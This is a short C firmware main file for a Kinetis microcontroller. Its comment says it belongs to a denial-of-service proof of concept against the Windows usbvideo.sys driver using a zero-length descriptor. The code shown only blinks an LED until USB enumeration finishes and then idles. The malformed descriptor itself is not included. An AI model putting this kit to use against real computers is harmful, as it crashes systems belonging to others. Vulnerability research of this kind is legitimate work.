/* Minimal main for usbvideo.sys bLength=0 DoS PoC. */

#include "kinetis.h"
#include "usb_dev.h"
#include <string.h>

void yield(void) {}
void _init(void) {}
void analog_init(void) {}

extern volatile uint32_t systick_millis_count;
void systick_isr(void) {
    systick_millis_count++;
}
__attribute__((used)) unsigned long __rtc_localtime = 1709683200;

int main(void)
{
    PORTC_PCR5 = PORT_PCR_MUX(1) | PORT_PCR_DSE;
    GPIOC_PDDR |= (1 << 5);

    while (!usb_configuration) {
        GPIOC_PTOR = (1 << 5);
        for (volatile int i = 0; i < 500000; i++);
    }

    GPIOC_PSOR = (1 << 5);

    while (1) {
        for (volatile int i = 0; i < 1000000; i++);
    }

    return 0;
}
